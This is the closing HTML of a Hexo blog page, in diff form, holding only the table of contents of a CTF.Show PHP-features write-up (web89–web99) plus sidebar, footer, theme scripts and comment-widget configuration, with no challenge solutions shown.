+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web89"><span class="nav-number">1.</span> <span class="nav-text">web89</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web90"><span class="nav-number">2.</span> <span class="nav-text">web90</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9-1"><span class="nav-number">2.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-1"><span class="nav-number">2.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web91"><span class="nav-number">3.</span> <span class="nav-text">web91</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-2"><span class="nav-number">3.1.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web92-web94"><span class="nav-number">4.</span> <span class="nav-text">web92~web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">5.</span> <span class="nav-text">web95</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-3"><span class="nav-number">5.1.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">6.</span> <span class="nav-text">web96</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9-2"><span class="nav-number">6.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-4"><span class="nav-number">6.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">7.</span> <span class="nav-text">web97</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9-3"><span class="nav-number">7.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-5"><span class="nav-number">7.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web98"><span class="nav-number">8.</span> <span class="nav-text">web98</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9-4"><span class="nav-number">8.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-6"><span class="nav-number">8.2.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">8.2.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">8.2.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">8.2.3.</span> <span class="nav-text">方法三</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web99"><span class="nav-number">9.</span> <span class="nav-text">web99</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-7"><span class="nav-number">9.1.</span> <span class="nav-text">做题</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html",
+      identifier: "archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html",
+      title     : "【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
